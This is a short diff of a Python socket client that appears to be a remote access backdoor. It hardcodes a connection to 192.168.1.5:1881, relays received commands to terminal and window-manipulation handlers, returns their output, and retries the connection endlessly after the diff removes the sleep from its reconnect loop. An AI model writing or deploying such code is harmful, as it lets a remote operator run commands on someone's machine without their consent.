@@ -8,7 +8,7 @@ import sys
 class Client(socket.socket):
     def __init__(self) -> None:
         super().__init__(socket.AF_INET,socket.SOCK_STREAM)
-        self.connect(("",1881))
+        self.connect(("192.168.1.5",1881))
         Thread(target=self.comminication()).start()
 
     def comminication(self):
@@ -43,11 +43,22 @@ class Client(socket.socket):
                         cc.terminalCommands(cmd)
                         self.send(b"exited")
                         break
+            
+            elif commands == "win-map":
+                while True:
+                    cmd = self.recv(1024).decode()
+                    if cmd != "e--":
+                        try:
+                            self.send(cc.winManupilation(cmd).encode())
+                        except:
+                            self.send(b" ")
+                    else:
+                        self.send(b"exited")
+                        break
 
 def main():
     try:
         Client()
     except ConnectionRefusedError:
         main()
-        sleep(1)
 main()
